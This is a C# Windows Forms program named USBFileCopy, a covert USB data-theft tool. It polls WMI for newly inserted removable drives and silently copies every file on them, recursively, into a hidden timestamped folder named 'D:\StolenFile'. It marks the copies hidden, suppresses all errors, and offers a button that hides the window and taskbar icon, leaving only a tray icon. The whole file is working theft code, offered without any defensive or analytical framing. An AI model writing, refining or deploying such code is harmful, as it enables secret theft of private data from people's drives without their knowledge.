using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Management;

namespace USBFileCopy
{
    public partial class Form1 : Form
    {
        const int RemovableDisk = 2;
        const int RamDisk = 6;

        bool startFlag = true;
        Thread DiskAdd = null;
        ManagementObjectSearcher Mquery = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            DiskAdd = new Thread(DiskUpdate);
            DiskAdd.Start();
        }

        private void DiskUpdate()
        {
            var bqueryCollection = Mquery.Get();
            while(startFlag)
            {
                var query = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
                var aqueryCollection = query.Get();
                if(aqueryCollection.Count!=bqueryCollection.Count)
                {
                    startFlag = false;
                    Mquery = query;
                    bqueryCollection = aqueryCollection;
                    DiskSelect();
                }
            }
        }

        private void DiskSelect()
        {
            var queryCollection = Mquery.Get();
            foreach(var drive in queryCollection)
            {
                switch(Convert.ToInt32(drive["DriveType"].ToString()))
                {
                    case RemovableDisk:
                        OnDriveArrived(drive["Name"].ToString());
                        break;
                }
            }
            startFlag = true;
        }

        private void OnDriveArrived(string diskpath)
        {
            var ThreadUSBCopy = new Thread(new ParameterizedThreadStart(copySubFolder));
            ThreadUSBCopy.Start(diskpath + @"\\" + "?" + @"D:\\StolenFile" + @"\\" + DateTime.Now.ToString().Replace(':', '.'));
        }

        private void copySubFolder(object copyInfo)
        {
            try
            {
                var copyString = Convert.ToString(copyInfo).Split('?');
                var copyFrom = copyString[0];
                var copyTo = copyString[1];
                var fromDir = new DirectoryInfo(copyFrom);
                var toDir = new DirectoryInfo(copyTo);
                DirectoryInfo[] fromDirs = null;

                toDir.Create();
                toDir.Attributes = FileAttributes.Hidden;
                fromDirs = fromDir.GetDirectories();

                var fromFile = fromDir.GetFiles();

                for(int i=0;i<fromFile.Length;i++)
                {
                    fromFile[i].CopyTo(toDir.ToString() + @"\\" + fromFile[i].Name);
                    File.SetAttributes(toDir.ToString() + @"\\" + fromFile[i].Name, FileAttributes.Hidden);
                }

                for (int i = 0; i < fromDirs.Length; i++)
                    copySubFolder(fromDirs[i].FullName + "?" + copyTo + @"\\" + fromDirs[i].Name);
            }
            catch(Exception)
            {
                return;
            }
        }

        private void HideButton_Click(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.ShowIcon = false;
            VisibleChange(false, true);
        }

        private void VisibleChange(bool FormVisible,bool TrayIconVisible)
        {
            this.Visible = FormVisible;
            this.nyiTray.Visible = TrayIconVisible;
        }

        private void nyiTray_DoubleClick(object sender, EventArgs e)
        {
            VisibleChange(true, false);
            this.ShowInTaskbar = true;
            this.ShowIcon = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (DiskAdd != null)
                DiskAdd.Abort();
            Application.ExitThread();
        }
    }
}
